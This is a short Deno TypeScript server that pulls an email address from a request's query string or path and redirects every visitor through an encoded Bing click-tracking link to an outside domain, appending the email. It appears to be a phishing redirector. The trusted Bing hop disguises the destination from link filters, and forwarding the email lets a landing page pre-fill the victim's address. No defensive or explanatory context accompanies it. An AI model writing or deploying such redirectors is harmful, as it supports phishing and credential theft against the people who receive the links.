const PORT = Number(Deno.env.get("PORT") || 8080);

Deno.serve({ port: PORT }, async (req) => {
  const url = new URL(req.url);

  const redirectBase =
    "https://www.bing.com/ck/a?!&&p=82b1182da358da9a8ce89787e818ec7e2e11251ce2a224003dd1b978f82a3f9cJmltdHM9MTc4MjM0NTYwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly8xaGNtLmdwc3RyYWNraW5nLnBlLw";

  let email: string | null = null;

  const state = url.searchParams.get("state");
  if (state) {
    try {
      const decoded = decodeURIComponent(state);
      if (decoded.includes("@") && !decoded.includes("/")) {
        email = decoded;
      }
    } catch {
      email = null;
    }
  }

  if (!email) {
    const path = url.pathname.replace(/\/+$/, "").split("/").at(-1);
    if (path && path.includes("@") && !path.includes("/")) {
      try {
        email = decodeURIComponent(path);
      } catch {
        email = null;
      }
    }
  }

  const redirectUrl = email
    ? redirectBase.replace(/\/+$/, "") + "/" + email
    : redirectBase;

  return Response.redirect(redirectUrl, 302);
});
